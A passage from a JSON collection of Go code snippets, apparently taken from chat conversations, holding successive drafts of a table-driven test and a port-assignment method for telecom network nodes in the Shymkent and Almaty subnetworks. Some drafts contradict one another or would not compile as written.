    "libraries": [],
    "code": "// Validate TnPort if Connection Direct\nif c.Connection == \"Direct\" {\n\terr = validation.Validate(c.TnPort,\n\t\tvalidation.Required,\n\t\tvalidation.By(func(value interface{}) error {\n\t\t\ttnPort := value.(string)\n\t\t\tif tnPort == \"\" {\n\t\t\t\treturn nil\n\t\t\t}\n\t\t\tif !isValidTnPort(tnPort) {\n\t\t\t\treturn fmt.Errorf(\"invalid TnPort\")\n\t\t\t}\n\t\t\treturn nil\n\t\t}),\n\t)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Validate Bridge\n\terr = validation.Validate(c.Bridge,\n\t\tvalidation.Required,\n\t\tvalidation.By(func(value interface{}) error {\n\t\t\tbridge := value.(string)\n\t\t\tif bridge == \"No\" {\n\t\t\t\treturn nil\n\t\t\t}\n\t\t\tif !isValidBridge(bridge) {\n\t\t\t\treturn fmt.Errorf(\"invalid Bridge\")\n\t\t\t}\n\t\t\treturn nil\n\t\t}),\n\t)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Validate TnPort2 for Bridge\n\tif c.Bridge == \"No\" {\n\t\terr = validation.Validate(c.TnPort2,\n\t\t\tvalidation.Required,\n\t\t\tvalidation.By(func(value interface{}) error {\n\t\t\t\ttnPort2 := value.(string)\n\t\t\t\tif tnPort2 == \"\" {\n\t\t\t\t\treturn nil\n\t\t\t\t}\n\t\t\t\tif !isValidTnPort(tnPort2) {\n\t\t\t\t\treturn fmt.Errorf(\"invalid TnPort2\")\n\t\t\t\t}\n\t\t\t\treturn nil\n\t\t\t}),\n\t\t)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n}",
    "filename": "ab981fd906a3b455b46931e9fa1a53fe_0.go"
  },
  {
    "conversation_hash": "d7a80504f9fde11297ee944a349f54e7",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"testing\"\n)\n\ntype SubNetwork struct {\n\tName string\n}\n\ntype EranConnection struct {\n\tSubNetwork SubNetwork\n\tTnPort     string\n\tTnPort2    string\n}\n\nfunc (e *EranConnection) port() {\n\t// Do some logic to set TnPort and TnPort2 based on SubNetwork\n}\n\nfunc TestEran_Port(t *testing.T) {\n\tcases := []struct {\n\t\tsubNetwork string\n\t\tnodes      map[string]map[string]map[string]string\n\t\tname       string\n\t\ttnPort     string\n\t\ttnPort2    string\n\t}{\n\t\t{\n\t\t\tsubNetwork: \"Shymkent\",\n\t\t\tnodes: map[string]map[string]map[string]string{\n\t\t\t\t\"ERBS_41001_BCUKGU_2_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"Name\": \"ERBS_41001_BCUKGU_2_KKT\",\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t\tname:    \"ERBS_41001_BCUKGU_1_KKT\",\n\t\t\ttnPort:  \"TN_IDL_D\",\n\t\t\ttnPort2: \"\",\n\t\t},\n\t\t{\n\t\t\tsubNetwork: \"Shymkent\",\n\t\t\tnodes: map[string]map[string]map[string]string{\n\t\t\t\t\"GRBS_41001_BCUKGU_1_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"Name\": \"GRBS_41001_BCUKGU_1_KKT\",\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t\tname:    \"ERBS_41001_BCUKGU_1_KKT\",\n\t\t\ttnPort:  \"TN_IDL_C\",\n\t\t\ttnPort2: \"\",\n\t\t},\n\t\t// Add other test cases\n\t}\n\n\tfor _, c := range cases {\n\t\ttestName := fmt.Sprintf(\"%s - %s\", c.subNetwork, c.name)\n\t\tt.Run(testName, func(t *testing.T) {\n\t\t\telasticran := EranConnection{\n\t\t\t\tSubNetwork: SubNetwork{\n\t\t\t\t\tName: c.subNetwork,\n\t\t\t\t},\n\t\t\t}\n\n\t\t\telasticran.port()\n\n\t\t\tif elasticran.TnPort != c.tnPort {\n\t\t\t\tt.Errorf(\"[%s] Expected TnPort to be %s, but got %s\", testName, c.tnPort, elasticran.TnPort)\n\t\t\t}\n\n\t\t\tif elasticran.TnPort2 != c.tnPort2 {\n\t\t\t\tt.Errorf(\"[%s] Expected TnPort2 to be %s, but got %s\", testName, c.tnPort2, elasticran.TnPort2)\n\t\t\t}\n\t\t})\n\t}\n}",
    "filename": "d7a80504f9fde11297ee944a349f54e7_0.go"
  },
  {
    "conversation_hash": "cee0ce5ba0b3d16606750b0500d909b5",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func TestEran_Port(t *testing.T) {\n\tcases := []struct {\n\t\tsubNetwork string\n\t\tnodes      map[string]map[string]map[string]string\n\t\tname       string\n\t\ttnPort     string\n\t\ttnPort2    string\n\t}{\n\t\t{\n\t\t\tsubNetwork: \"Shymkent\",\n\t\t\tnodes: map[string]map[string]map[string]string{\n\t\t\t\t\"ERBS_41001_BCUKGU_2_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"Name\":\"ERBS_41001_BCUKGU_2_KKT\",\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t\tname:    \"ERBS_41001_BCUKGU_1_KKT\",\n\t\t\ttnPort:  \"TN_IDL_D\",\n\t\t\ttnPort2: \"\",\n\t\t},\n\t\t{\n\t\t\tsubNetwork: \"Shymkent\",\n\t\t\tnodes: map[string]map[string]map[string]string{\n\t\t\t\t\"GRBS_41001_BCUKGU_1_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"Name\":\"GRBS_41001_BCUKGU_1_KKT\",\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t\tname:    \"ERBS_41001_BCUKGU_1_KKT\",\n\t\t\ttnPort:  \"TN_IDL_C\",\n\t\t\ttnPort2: \"\",\n\t\t},\n\t\t{\n\t\t\tsubNetwork: \"Shymkent\",\n\t\t\tnodes: map[string]map[string]map[string]string{\n\t\t\t\t\"ERBS_41001_BCUKGU_1_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"Name\":\"ERBS_41001_BCUKGU_1_KKT\",\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t\tname:    \"GRBS_41001_BCUKGU_1_KKT\",\n\t\t\ttnPort:  \"TN_IDL_C\",\n\t\t\ttnPort2: \"\",\n\t\t},\n\t\t{\n\t\t\tsubNetwork: \"Almaty\",\n\t\t\tnodes: map[string]map[string]map[string]string{\n\t\t\t\t\"ERBS_01001_BCUKGU_1_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"Name\":\"ERBS_01001_BCUKGU_1_KKT\",\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t\tname:    \"GRBS_01001_BCUKGU_1_KKT\",\n\t\t\ttnPort:  \"TN_IDL_C\",\n\t\t\ttnPort2: \"\",\n\t\t},\n\t\t{\n\t\t\tsubNetwork: \"Almaty\",\n\t\t\tnodes: map[string]map[string]map[string]string{\n\t\t\t\t\"GRBS_01001_BCUKGU_1_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"Name\":\"GRBS_01001_BCUKGU_1_KKT\",\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t\tname:    \"ERBS_01001_BCUKGU_1_KKT\",\n\t\t\ttnPort:  \"TN_A\",\n\t\t\ttnPort2: \"\",\n\t\t},\n\t\t{\n\t\t\tsubNetwork: \"Almaty\",\n\t\t\tnodes: map[string]map[string]map[string]string{\n\t\t\t\t\"ERBS_01001_BCUKGU_2_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"Name\":\"ERBS_01001_BCUKGU_2_KKT\",\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t\tname:    \"ERBS_01001_BCUKGU_1_KKT\",\n\t\t\ttnPort:  \"TN_B\",\n\t\t\ttnPort2: \"\",\n\t\t},\n\t\t{\n\t\t\tsubNetwork: \"Shymkent\",\n\t\t\tnodes: map[string]map[string]map[string]string{\n\t\t\t\t\"ERBS_41001_BCUKGU_1_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"Name\":\"ERBS_41001_BCUKGU_1_KKT\",\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t\t\"ERBS_41001_BCUKGU_2_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"Name\":\"ERBS_41001_BCUKGU_2_KKT\",\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t\tname:    \"GRBS_01001_BCUKGU_1_KKT\",\n\t\t\ttnPort:  \"TN_IDL_C\",\n\t\t\ttnPort2: \"TN_IDL_D\",\n\t\t},\n\t\t{\n\t\t\tsubNetwork: \"Shymkent\",\n\t\t\tnodes: map[string]map[string]map[string]string{\n\t\t\t\t\"GRBS_41001_BCUKGU_1_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"Name\":\"GRBS_41001_BCUKGU_1_KKT\",\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t\t\"ERBS_41001_BCUKGU_1_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"Name\":\"ERBS_41001_BCUKGU_1_KKT\",\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t\tname:    \"ERBS_41001_BCUKGU_2_KKT\",\n\t\t\ttnPort:  \"TN_IDL_D\",\n\t\t\ttnPort2: \"TN_IDL_C\",\n\t\t},\n\t\t{\n\t\t\tsubNetwork: \"Almaty\",\n\t\t\tnodes: map[string]map[string]map[string]string{\n\t\t\t\t\"GRBS_01001_BCUKGU_1_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"Name\":\"GRBS_01001_BCUKGU_1_KKT\",\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t\t\"ERBS_01001_BCUKGU_2_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"Name\":\"ERBS_01001_BCUKGU_2_KKT\",\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t\tname:    \"ERBS_01001_BCUKGU_1_KKT\",\n\t\t\ttnPort:  \"TN_B\",\n\t\t\ttnPort2: \"TN_A\",\n\t\t},\n\t\t{\n\t\t\tsubNetwork: \"Almaty\",\n\t\t\tnodes: map[string]map[string]map[string]string{\n\t\t\t\t\"ERBS_01001_BCUKGU_1_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"Name\":\"ERBS_01001_BCUKGU_1_KKT\",\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t\t\"ERBS_01001_BCUKGU_2_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"Name\":\"ERBS_01001_BCUKGU_2_KKT\",\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t\tname:    \"GRBS_01001_BCUKGU_1_KKT\",\n\t\t\ttnPort:  \"TN_IDL_C\",\n\t\t\ttnPort2: \"TN_IDL_D\",\n\t\t},\n\t}\n\n\tfor _, c := range cases {\n\t\ttestName := fmt.Sprintf(\"[%s] %s\", c.subNetwork, c.name)\n\t\tt.Run(testName, func(t *testing.T) {\n\t\t\telasticran := EranConnection{\n\t\t\t\tSubNetwork: SubNetwork{\n\t\t\t\t\tName: c.subNetwork,\n\t\t\t\t},\n\t\t\t\tENodeB: ENodeB{\n\t\t\t\t\tCellular: Cellular{\n\t\t\t\t\t\tName: c.name,\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t\tNodes: Nodes(c.nodes),\n\t\t\t}\n\n\t\t\telasticran.port()\n\n\t\t\tif elasticran.TnPort != c.tnPort {\n\t\t\t\tt.Errorf(\"[%s] Expected TnPort to be %s, but got %s\", testName, c.tnPort, elasticran.TnPort)\n\t\t\t}\n\n\t\t\tif elasticran.TnPort2 != c.tnPort2 {\n\t\t\t\tt.Errorf(\"[%s] Expected TnPort2 to be %s, but got %s\", testName, c.tnPort2, elasticran.TnPort2)\n\t\t\t}\n\t\t})\n\t}\n}",
    "filename": "cee0ce5ba0b3d16606750b0500d909b5_0.go"
  },
  {
    "conversation_hash": "729647d6d03bee705e68386be575bd4a",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func TestEran_Port(t *testing.T) {\n\tcases := []struct {\n\t\tsubNetwork string\n\t\tnodes      map[string]map[string]map[string]map[string]string\n\t\tname       string\n\t\ttnPort     string\n\t\ttnPort2    string\n\t}{\n\t\t{\n\t\t\tsubNetwork: \"Shymkent\",\n\t\t\tnodes: map[string]map[string]map[string]map[string]string{\n\t\t\t\t\"ERBS_41001_BCUKGU_2_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"Name\": \"ERBS_41001_BCUKGU_2_KKT\",\n\t\t\t\t\t\t\"CellsGroups\": {\n\t\t\t\t\t\t\t\"Kcell\": \"41511A1L-D4L\",\n\t\t\t\t\t\t},\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t\tname:    \"ERBS_41001_BCUKGU_1_KKT\",\n\t\t\ttnPort:  \"TN_IDL_D\",\n\t\t\ttnPort2: \"\",\n\t\t},\n\t}\n}",
    "filename": "729647d6d03bee705e68386be575bd4a_0.go"
  },
  {
    "conversation_hash": "729647d6d03bee705e68386be575bd4a",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func TestEran_Port(t *testing.T) {\n\tcases := []struct {\n\t\tsubNetwork string\n\t\tnodes      map[string]map[string]map[string]map[string]string\n\t\tname       string\n\t\ttnPort     string\n\t\ttnPort2    string\n\t}{\n\t\t{\n\t\t\tsubNetwork: \"Shymkent\",\n\t\t\tnodes: map[string]map[string]map[string]map[string]string{\n\t\t\t\t\"ERBS_41001_BCUKGU_2_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"Name\":\"ERBS_41001_BCUKGU_2_KKT\",\n\t\t\t\t\t\t\"CellsGroups\":{\n\t\t\t\t\t\t\t\"Kcell\":\"41511A1L-D4L\",\n\t\t\t\t\t\t},\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t\tname:       \"ERBS_41001_BCUKGU_1_KKT\",\n\t\t\ttnPort:     \"TN_IDL_D\",\n\t\t\ttnPort2:    \"\",\n\t\t},\n\t}\n}",
    "filename": "729647d6d03bee705e68386be575bd4a_1.go"
  },
  {
    "conversation_hash": "729647d6d03bee705e68386be575bd4a",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func TestEran_Port(t *testing.T) {\n\tcases := []struct {\n\t\tsubNetwork string\n\t\tnodes      map[string]map[string]map[string]map[string]string\n\t\tname       string\n\t\ttnPort     string\n\t\ttnPort2    string\n\t}{\n\t\t{\n\t\t\tsubNetwork: \"Shymkent\",\n\t\t\tnodes: map[string]map[string]map[string]map[string]string{\n\t\t\t\t\"ERBS_41001_BCUKGU_2_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"Name\": \"ERBS_41001_BCUKGU_2_KKT\",\n\t\t\t\t\t\t\"CellsGroups\": map[string]string{\n\t\t\t\t\t\t\t\"Kcell\": \"41511A1L-D4L\",\n\t\t\t\t\t\t},\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t\tname:    \"ERBS_41001_BCUKGU_1_KKT\",\n\t\t\ttnPort:  \"TN_IDL_D\",\n\t\t\ttnPort2: \"\",\n\t\t},\n\t}\n}",
    "filename": "729647d6d03bee705e68386be575bd4a_2.go"
  },
  {
    "conversation_hash": "729647d6d03bee705e68386be575bd4a",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "func TestEran_Port(t *testing.T) {\n\tcases := []struct {\n\t\tsubNetwork string\n\t\tnodes      map[string]map[string]map[string]map[string]string\n\t\tname       string\n\t\ttnPort     string\n\t\ttnPort2    string\n\t}{\n\t\t{\n\t\t\tsubNetwork: \"Shymkent\",\n\t\t\tnodes: map[string]map[string]map[string]map[string]string{\n\t\t\t\t\"ERBS_41001_BCUKGU_2_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"ERBS_41001_BCUKGU_2_KKT\": {\n\t\t\t\t\t\t\t\"Name\": \"ERBS_41001_BCUKGU_2_KKT\",\n\t\t\t\t\t\t\t\"CellsGroups\": map[string]string{\n\t\t\t\t\t\t\t\t\"Kcell\": \"41511A1L-D4L\",\n\t\t\t\t\t\t\t},\n\t\t\t\t\t\t},\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t\tname:    \"ERBS_41001_BCUKGU_1_KKT\",\n\t\t\ttnPort:  \"TN_IDL_D\",\n\t\t\ttnPort2: \"\",\n\t\t},\n\t}\n}",
    "filename": "729647d6d03bee705e68386be575bd4a_3.go"
  },
  {
    "conversation_hash": "8bc847b1a68a8e50e4ce486b6ac39db8",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func TestEran_Port(t *testing.T) {\n\tcases := []struct {\n\t\tsubNetwork string\n\t\tnodes      map[string]map[string]map[string]map[string]string\n\t\tname       string\n\t\ttnPort     string\n\t\ttnPort2    string\n\t}{\n\t\t// Test cases...\n\t}\n\n\tfor _, c := range cases {\n\t\ttestName := fmt.Sprintf(\"[%s] %s\", c.subNetwork, c.name)\n\t\tt.Run(testName, func(t *testing.T) {\n\t\t\telasticran := EranConnection{\n\t\t\t\tSubNetwork: SubNetwork{\n\t\t\t\t\tName: c.subNetwork,\n\t\t\t\t},\n\t\t\t\tENodeB: ENodeB{\n\t\t\t\t\tSite: Site{\n\t\t\t\t\t\tCellular: Cellular{\n\t\t\t\t\t\t\tName: c.name,\n\t\t\t\t\t\t},\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t\tNodes: Nodes(c.nodes),\n\t\t\t}\n\n\t\t\telasticran.port()\n\n\t\t\tif elasticran.TnPort != c.tnPort {\n\t\t\t\tt.Errorf(\"[%s] Expected TnPort to be %s, but got %s\", testName, c.tnPort, elasticran.TnPort)\n\t\t\t}\n\n\t\t\tif elasticran.TnPort2 != c.tnPort2 {\n\t\t\t\tt.Errorf(\"[%s] Expected TnPort2 to be %s, but got %s\", testName, c.tnPort2, elasticran.TnPort2)\n\t\t\t}\n\t\t})\n\t}\n}",
    "filename": "8bc847b1a68a8e50e4ce486b6ac39db8_0.go"
  },
  {
    "conversation_hash": "af559471df25f20ce0e010a62de3ead8",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func (elasticran *EranConnection) port() {\n\tname := elasticran.ENodeB.Cellular.Name\n\tsubNetwork := elasticran.SubNetwork.Name\n\tnodes := elasticran.Nodes\n\n\tnodeNames := make([]string, 0, len(nodes))\n\tfor nodeName := range nodes {\n\t\tnodeNames = append(nodeNames, nodeName)\n\t}\n\n\telasticran.tnPort2 = \"\"\n\tif strings.HasPrefix(name, \"GRBS\") {\n\t\telasticran.tnPort = \"TN_IDL_C\"\n\t} else if strings.HasPrefix(name, \"ERBS\") && strings.Contains(name, \"_1_\") {\n\t\tif subNetwork == \"Shymkent\" {\n\t\t\telasticran.tnPort = \"TN_IDL_D\"\n\t\t} else {\n\t\t\telasticran.tnPort = \"TN_B\"\n\t\t}\n\t} else if strings.HasPrefix(name, \"ERBS\") && strings.Contains(name, \"_2_\") {\n\t\tif subNetwork == \"Shymkent\" {\n\t\t\telasticran.tnPort = \"TN_IDL_C\"\n\t\t} else {\n\t\t\telasticran.tnPort = \"TN_A\"\n\t\t}\n\t}\n\n\tif len(nodeNames) == 2 {\n\t\tif strings.HasPrefix(name, \"GRBS\") {\n\t\t\telasticran.tnPort2 = \"TN_IDL_D\"\n\t\t} else if strings.HasPrefix(name, \"ERBS\") {\n\t\t\tif subNetwork == \"Shymkent\" {\n\t\t\t\telasticran.tnPort2 = \"TN_IDL_C\"\n\t\t\t} else {\n\t\t\t\telasticran.tnPort2 = \"TN_A\"\n\t\t\t}\n\t\t}\n\t}\n}",
    "filename": "af559471df25f20ce0e010a62de3ead8_0.go"
  },
  {
    "conversation_hash": "af559471df25f20ce0e010a62de3ead8",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "import (\n\t\"testing\"\n\t\"fmt\"\n\t\"strings\"\n)",
    "filename": "af559471df25f20ce0e010a62de3ead8_1.go"
  },
  {
    "conversation_hash": "af559471df25f20ce0e010a62de3ead8",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "type TN_PORT string\n\nconst (\n\tTN_IDL_C TN_PORT = \"TN_IDL_C\"\n\tTN_IDL_D TN_PORT = \"TN_IDL_D\"\n\tTN_A     TN_PORT = \"TN_A\"\n\tTN_B     TN_PORT = \"TN_B\"\n)",
    "filename": "af559471df25f20ce0e010a62de3ead8_2.go"
  },
  {
    "conversation_hash": "af559471df25f20ce0e010a62de3ead8",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "...\nif elasticran.TnPort != nil && *elasticran.TnPort != *c.tnPort {\n    t.Errorf(\"[%s] Expected TnPort to be %s, but got %s\", testName, *c.tnPort, *elasticran.TnPort)\n}\n\nif elasticran.TnPort2 != nil && *elasticran.TnPort2 != *c.tnPort2 {\n    t.Errorf(\"[%s] Expected TnPort2 to be %s, but got %s\", testName, *c.tnPort2, *elasticran.TnPort2)\n}\n...",
    "filename": "af559471df25f20ce0e010a62de3ead8_4.go"
  },
  {
    "conversation_hash": "af559471df25f20ce0e010a62de3ead8",
    "code_index": 6,
    "language": "Go",
    "libraries": [
      "path"
    ],
    "code": "import (\n\t\"testing\"\n\t\"fmt\"\n\t\"strings\"\n\t\"github.com/path/to/model\" // Replace with the actual import path\n)",
    "filename": "af559471df25f20ce0e010a62de3ead8_6.go"
  },
  {
    "conversation_hash": "af559471df25f20ce0e010a62de3ead8",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "func TestEran_Port(t *testing.T) {\n\tcases := []struct {\n\t\tsubNetwork string\n\t\tnodes      model.Nodes\n\t\tname       string\n\t\ttnPort     string\n\t\ttnPort2    string\n\t}{\n\t\t// Test cases\n\t}\n\n\tfor _, c := range cases {\n\t\ttestName := fmt.Sprintf(\"[%s] %s\", c.subNetwork, c.name)\n\t\tt.Run(testName, func(t *testing.T) {\n\t\t\telasticran := EranConnection{\n\t\t\t\tSubNetwork: SubNetwork{\n\t\t\t\t\tName: c.subNetwork,\n\t\t\t\t},\n\t\t\t\tENodeB: ENodeB{\n\t\t\t\t\tSite: Site{\n\t\t\t\t\t\tCellular: Cellular{\n\t\t\t\t\t\t\tName: c.name,\n\t\t\t\t\t\t},\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t\tNodes: model.Nodes(c.nodes),\n\t\t\t}\n\n\t\t\telasticran.port()\n\n\t\t\tif elasticran.TnPort != c.tnPort {\n\t\t\t\tt.Errorf(\"[%s] Expected TnPort to be %s, but got %s\", testName, c.tnPort, elasticran.TnPort)\n\t\t\t}\n\n\t\t\tif elasticran.TnPort2 != c.tnPort2 {\n\t\t\t\tt.Errorf(\"[%s] Expected TnPort2 to be %s, but got %s\", testName, c.tnPort2, elasticran.TnPort2)\n\t\t\t}\n\t\t})\n\t}\n}",
    "filename": "af559471df25f20ce0e010a62de3ead8_7.go"
  },
  {
    "conversation_hash": "1933730b1f2b0e8a028c34b1a88fe7ca",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package model\n\nimport (\n\t\"fmt\"\n\t\"strings\"\n\t\"testing\"\n)\n\nfunc TestEran_Port(t *testing.T) {\n\tcases := []struct {\n\t\tsubNetwork string\n\t\tnodes      map[string]map[string]map[string]map[string]string\n\t\tname       string\n\t\ttnPort     string\n\t\ttnPort2    string\n\t}{\n\t\t// Test case 1: Single node, GRBS prefix\n\t\t{\n\t\t\tsubNetwork: \"Shymkent\",\n\t\t\tnodes: map[string]map[string]map[string]map[string]string{\n\t\t\t\t\"ERBS_41001_BCUKGU_2_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"CellsGroups\": {\n\t\t\t\t\t\t\t\"Kcell\": \"41511A1L-D4L\",\n\t\t\t\t\t\t},\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t\tname:    \"ERBS_41001_BCUKGU_1_KKT\",\n\t\t\ttnPort:  \"TN_IDL_D\",\n\t\t\ttnPort2: \"\",\n\t\t},\n\t\t// Test case 2: Single node, ERBS_1 prefix and GRBS prefix in nodes\n\t\t{\n\t\t\tsubNetwork: \"Shymkent\",\n\t\t\tnodes: map[string]map[string]map[string]map[string]string{\n\t\t\t\t\"GRBS_41001_BCUKGU_1_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"CellsGroups\": {\n\t\t\t\t\t\t\t\"Kcell\": \"41511A1L-D4L\",\n\t\t\t\t\t\t},\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t\tname:    \"ERBS_41001_BCUKGU_1_KKT\",\n\t\t\ttnPort:  \"TN_IDL_C\",\n\t\t\ttnPort2: \"\",\n\t\t},\n\t\t// Test case 3: Single node, ERBS_1 prefix and ERBS_1 prefix in nodes\n\t\t{\n\t\t\tsubNetwork: \"Shymkent\",\n\t\t\tnodes: map[string]map[string]map[string]map[string]string{\n\t\t\t\t\"ERBS_41001_BCUKGU_1_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"CellsGroups\": {\n\t\t\t\t\t\t\t\"Kcell\": \"41511A1L-D4L\",\n\t\t\t\t\t\t},\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t\tname:    \"GRBS_41001_BCUKGU_1_KKT\",\n\t\t\ttnPort:  \"TN_IDL_C\",\n\t\t\ttnPort2: \"\",\n\t\t},\n\t\t// Test case 4: Single node, ERBS_1 prefix and different subNetwork\n\t\t{\n\t\t\tsubNetwork: \"Almaty\",\n\t\t\tnodes: map[string]map[string]map[string]map[string]string{\n\t\t\t\t\"ERBS_01001_BCUKGU_1_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"CellsGroups\": {\n\t\t\t\t\t\t\t\"Kcell\": \"41511A1L-D4L\",\n\t\t\t\t\t\t},\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t\tname:    \"GRBS_01001_BCUKGU_1_KKT\",\n\t\t\ttnPort:  \"TN_IDL_C\",\n\t\t\ttnPort2: \"\",\n\t\t},\n\t\t// Test case 5: Two nodes, GRBS prefix\n\t\t{\n\t\t\tsubNetwork: \"Shymkent\",\n\t\t\tnodes: map[string]map[string]map[string]map[string]string{\n\t\t\t\t\"ERBS_41001_BCUKGU_1_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"CellsGroups\": {\n\t\t\t\t\t\t\t\"Kcell\": \"41511A1L-D4L\",\n\t\t\t\t\t\t},\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t\t\"ERBS_41001_BCUKGU_2_KKT\": {\n\t\t\t\t\t\"EUtranCellData\": {\n\t\t\t\t\t\t\"CellsGroups\": {\n\t\t\t\t\t\t\t\"Kcell\": \"41511A1L-D4L\",\n\t\t\t\t\t\t},\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t\tname:    \"GRBS_01001_BCUKGU_1_KKT\",\n\t\t\ttnPort:  \"TN_IDL_C\",\n\t\t\ttnPort2: \"TN_IDL_D\",\n\t\t},\n\t}\n\n\tfor _, c := range cases {\n\t\ttestName := fmt.Sprintf(\"[%s] %s\", c.subNetwork, c.name)\n\t\tt.Run(testName, func(t *testing.T) {\n\t\t\telasticran := EranConnection{\n\t\t\t\tSubNetwork: SubNetwork{\n\t\t\t\t\tName: c.subNetwork,\n\t\t\t\t},\n\t\t\t\tENodeB: ENodeB{\n\t\t\t\t\tSite: Site{\n\t\t\t\t\t\tCellular: Cellular{\n\t\t\t\t\t\t\tName: c.name,\n\t\t\t\t\t\t},\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t\tNodes: Nodes(c.nodes),\n\t\t\t}\n\n\t\t\telasticran.port()\n\n\t\t\tif elasticran.TnPort != c.tnPort {\n\t\t\t\tt.Errorf(\"[%s] Expected TnPort to be %s, but got %s\", testName, c.tnPort, elasticran.TnPort)\n\t\t\t}\n\n\t\t\tif elasticran.TnPort2 != c.tnPort2 {\n\t\t\t\tt.Errorf(\"[%s] Expected TnPort2 to be %s, but got %s\", testName, c.tnPort2, elasticran.TnPort2)\n\t\t\t}\n\t\t})\n\t}\n}\n\ntype EranConnection struct {\n\tSubNetwork `json:\"subNetwork\"`\n\tENodeB     `json:\"parent\"`\n\tNodes      `json:\"children\"`\n}\n\nfunc (elasticran *EranConnection) port() {\n\tname := elasticran.ENodeB.Cellular.Name\n\tsubNetwork := elasticran.SubNetwork.Name\n\tnodes := elasticran.Nodes\n\n\tif len(nodes) == 1 {\n\t\tnodesname := nodes.Names()\n\t\telasticran.TnPort2 = \"\"\n\t\tif strings.HasPrefix(name, \"GRBS\") {\n\t\t\telasticran.TnPort = \"TN_IDL_C\"\n\t\t} else if strings.HasPrefix(name, \"ERBS\") && strings.Contains(name, \"_1_\") && strings.HasPrefix(nodesname[0], \"GRBS\") {\n\t\t\tif subNetwork == \"Shymkent\" {\n\t\t\t\telasticran.TnPort = 